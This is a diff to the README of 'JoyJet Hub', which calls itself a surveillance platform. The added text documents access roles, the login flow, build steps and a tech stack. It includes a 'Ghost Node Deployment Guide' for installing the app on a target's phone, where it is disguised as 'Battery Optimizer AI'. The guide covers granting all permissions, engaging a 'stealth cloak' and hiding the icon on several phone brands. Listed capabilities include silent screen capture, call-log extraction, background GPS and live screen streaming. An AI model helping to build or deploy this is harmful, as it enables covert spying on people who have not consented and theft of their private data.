@@ -2,8 +2,8 @@
 
 # ☣ JOYJET HUB — FEATURE REGISTRY v4.2
 
-**Quick-reference feature index for the JoyJet surveillance platform**  
-*See [FEATURES.md](./FEATURES.md) for the full operational encyclopedia*
+**Complete reference — Architecture · Auth · Keys · Features · Commands · GPS · Streaming · Stealth · Build · Quick Start**  
+*For step-by-step operational how-tos: [FEATURES.md](./FEATURES.md)*
 
 [![Build](https://github.com/guru9/joyjet-hub/actions/workflows/android-build.yml/badge.svg)](https://github.com/guru9/joyjet-hub/actions)
 [![Version](https://img.shields.io/badge/version-4.2.x-38BDF8?style=flat-square)](./CHANGELOG.md)
@@ -113,7 +113,198 @@ Target sees their normal home screen
 
 ---
 
+## 🔑 Access Key System
+
+Keys are validated **character-by-character** as you type — special characters are silently blocked. The Login button stays **disabled** until the format is 100% valid.
+
+```
+┌─ Admin ──────────────────────────────────────────────────────┐
+│  Key: admin    (+) Secure PIN (set via ADMIN_SECRET_KEY env) │
+└──────────────────────────────────────────────────────────────┘
+┌─ Viewer ─────────────────────────────────────────────────────┐
+│  Key: alphanumeric, min 4 chars, NO underscore               │
+│  ✅ alpha   bravo99   echo01                                  │
+│  ❌ al (too short)   alpha-1 (hyphen)   my.viewer (dot)      │
+└──────────────────────────────────────────────────────────────┘
+┌─ Ghost ──────────────────────────────────────────────────────┐
+│  Key: PREFIX_SUFFIX  (each part: alphanumeric, min 4 chars)  │
+│  ✅ alpha_node1   admin_cam01   bravo_unit01                  │
+│  ❌ al_node1 (prefix short)   alpha_dev (suffix short)       │
+│  ❌ alpha_cam-1 (special char)   al_pha_dev1 (two _)         │
+└──────────────────────────────────────────────────────────────┘
+```
+
+### Ghost Prefix Live-Check
+After typing a valid prefix + `_`, the app instantly queries the server:
+- ✅ **`PREFIX VALID`** — parent viewer/admin is online → Login enabled
+- ✗ **`PREFIX NOT FOUND`** — no matching parent → Login blocked
+
+### Login UX Flow
+1. Open app — login card shows **"COMMAND ACCESS"**
+2. As you type, special characters are silently rejected
+3. A **role pill** appears: `ADMIN` 🔴 / `GHOST` 🟡 / `VIEWER` 🔵
+4. If format wrong → input border turns red + error message below
+5. Login button stays **disabled** until format is fully valid
+6. For Ghost: live prefix check fires after valid `prefix_`
+7. Admin only: **Secure PIN** field appears when `admin` is entered
+
+---
+
+## 🔄 Authentication Flow
+
+```mermaid
+sequenceDiagram
+    participant C as 📱 Client App
+    participant S as 🖥️ Hub Server
+
+    C->>S: authenticate { user, pass, device, version }
+    S->>S: Validate key format (regex + length)
+
+    alt Admin
+        S->>S: Compare PIN vs ADMIN_SECRET_KEY
+        S->>C: auth_response { success: true, role: 'admin' }
+        S->>C: Joins admin_room socket group
+    else Ghost
+        S->>S: Parse prefix, check active viewers/admin
+        S->>C: auth_response { success: false } — if no prefix match
+        S->>C: auth_response { success: true, role: 'ghost' } — if ok
+        S->>C: ghost_online broadcast to Admin room
+    else Viewer
+        S->>S: Find all nodes with matching prefix
+        S->>C: auth_response { success: true, allowedNodes[] }
+        S->>C: Joins viewer_room_[name]
+    end
+```
+
+### Ghost Prefix Pre-Flight (fires before full auth)
+```
+Client → check_prefix { prefix: "alpha" }
+Server → prefix_result { valid: true, match: "alpha" }
+```
+This prevents a full auth rejection and provides instant typing feedback.
+
+---
+
+## 👻 Ghost Node Deployment Guide
+
+```
+1. Install APK on target device
+2. Open app (shown as "Battery Optimizer AI" in launcher)
+3. Enter ghost key: parentname_devicename  (e.g. alpha_phone1)
+4. Tap  ▶ BOOT SYSTEM INTERFACE  → login completes silently
+5. Tap  ◉ CALIBRATE  → grant all permissions when prompted
+6. Tap  🃏 ENGAGE STEALTH CLOAK  → app goes to background
+7. Optional: hide icon via Settings → Home Screen → Hide Apps
+```
+
+| Device (Launcher) | Steps to Hide Icon |
+|---|---|
+| **Samsung (One UI)** | Settings → Home Screen → Hide Apps |
+| **Xiaomi (MIUI)** | Settings → App Lock → Hidden Apps |
+| **OnePlus (OxygenOS)** | Settings → Home Screen → Hidden Space |
+| **Stock Android 12+** | Requires 3rd-party launcher (e.g. Nova Launcher) |
+
+---
+
+## 🚀 Quick Start
+
+### 1. Deploy the Server
+```bash
+git clone https://github.com/guru9/joyjet-server.git
+cd joyjet-server
+npm install
+cp .env.sample .env          # Set ADMIN_SECRET_KEY and PUBLIC_URL
+npm start
+```
+
+### 2. Install the App
+Download APK from [Releases](https://github.com/guru9/joyjet-hub/releases/latest) and install on **Android 11+**
+
+Or build from source:
+```bash
+git clone https://github.com/guru9/joyjet-hub.git
+cd joyjet-hub
+npm install --legacy-peer-deps
+npx expo prebuild -p android --clean
+cd android && ./gradlew assembleRelease
+```
+
+### 3. Configure Server URL
+Edit `src/services/socket.js`:
+```javascript
+const socket = io('https://your-server.onrender.com');
+```
+
+### 4. Operational Login Reference
+
+| Step | Role | Action |
+|---|---|---|
+| 1 | 🔴 Admin | Key: `admin` → PIN → **BOOT SYSTEM INTERFACE** |
+| 2 | 🔵 Viewer | Key: `alpha` → **BOOT SYSTEM INTERFACE** |
+| 3 | 🟡 Ghost | Key: `alpha_phone1` → Login → **CALIBRATE** → **STEALTH CLOAK** |
+| 4 | 🔴 Admin | Select node → FEED / MAP / SNAPS / CALLS / LOGS |
+
+---
+
+## 🛠️ Tech Stack
+
+### 📱 Client (joyjet-hub)
+
+| Technology | Version | Role |
+|---|---|---|
+| **React Native** | 0.83 | Core mobile framework (New Architecture / JSI) |
+| **Expo** | 55 | Managed native modules ecosystem |
+| **react-native-webrtc** | 124 | P2P screen streaming — STUN NAT traversal |
+| **Socket.IO Client** | 4.8 | Real-time bidirectional command/telemetry |
+| **expo-location** | 55.1.x | Foreground + background GPS with TaskManager |
+| **expo-battery** | 55.x | Battery level & charging state monitoring |
+| **expo-media-library** | 55.x | Evidence gallery album management |
+| **expo-file-system** | 55.x | Local file I/O for screenshots |
+| **expo-screen-capture** | 55.x | Silent screen capture (snapshot command) |
+| **react-native-call-log** | 3.x | Remote call history extraction |
+| **react-native-maps** | 1.27.x | Tactical GPS map rendering |
+| **React Navigation** | 7 | Gesture-driven tab workspace |
+| **@expo/vector-icons** | — | MaterialCommunityIcons icon library |
+| **Kotlin** | 2.1.20 | Android native build language |
+
+### 🖥️ Server (joyjet-server)
+
+| Technology | Version | Role |
+|---|---|---|
+| **Node.js** | 20+ | Server runtime |
+| **Express** | 4 | HTTP server and health endpoint |
+| **Socket.IO** | 4.8 | WebSocket engine: auth, relay, commands |
+| **fs (built-in)** | — | JSON-based node registry persistence |
+| **axios** | — | Server keep-alive heartbeat (Render.com) |
+
+---
+
+## 📟 Boot Sequence & System Logs
+
+When Admin logs in, a staged **boot sequence** fires at 400ms intervals:
+```
+COMMAND CENTER INITIALIZED. SCANNING NODES...
+ENCRYPTED NEURAL MAPPING: SUCCESS
+DIRECT SAT-LINK: ACTIVE
+MASTER HUB STANDING BY...
+```
+
+### Log Console Color Coding
+
+| Color | Trigger |
+|---|---|
+| 🔵 **Cyan** | SYSTEM events — node joins, command dispatches |
+| 🟢 **Green** | Battery/vitals updates |
+| 🟠 **Amber** | Call log entries |
+| 🔴 **Red** | ERROR conditions |
+| ⬜ **White** | General activity |
+
+> Logs auto-scroll to newest entry. Capped at **50 lines** (FIFO) to prevent memory buildup.
+
+---
+
 ## 🏛️ Core Infrastructure
+
 
 | Feature | Status | Details |
 |---|---|---|
